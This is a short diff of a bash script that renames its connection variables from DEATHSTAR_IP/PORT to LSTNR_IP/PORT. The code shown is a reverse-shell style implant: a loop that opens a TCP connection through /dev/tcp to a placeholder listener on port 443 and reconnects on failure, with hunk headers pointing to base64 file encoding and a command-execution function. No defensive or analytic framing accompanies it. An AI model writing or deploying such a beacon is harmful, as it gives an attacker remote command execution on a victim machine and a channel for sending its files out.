@@ -1,8 +1,8 @@
 #!/bin/bash
 
 # Configuration
-DEATHSTAR_IP="<DEATHSTAR_IP>"
-DEATHSTAR_PORT=443
+LSTNR_IP="<LSTNR_IP>"
+LSTNR_PORT=443
 RECONNECT_DELAY=5
 
 # Function to encode file content in base64
@@ -44,10 +44,10 @@ execute_command() {
 # Main connection loop
 while true; do
     # Create a TCP connection using /dev/tcp
-    exec 3>/dev/tcp/$DEATHSTAR_IP/$DEATHSTAR_PORT 2>/dev/null
+    exec 3>/dev/tcp/$LSTNR_IP/$LSTNR_PORT 2>/dev/null
     if [ $? -eq 0 ]; then
         exec 4<&3
-        echo "[+] Connected to $DEATHSTAR_IP:$DEATHSTAR_PORT"
+        echo "[+] Connected to $LSTNR_IP:$LSTNR_PORT"
         
         # Send initial empty data
         echo -e "\n" >&3
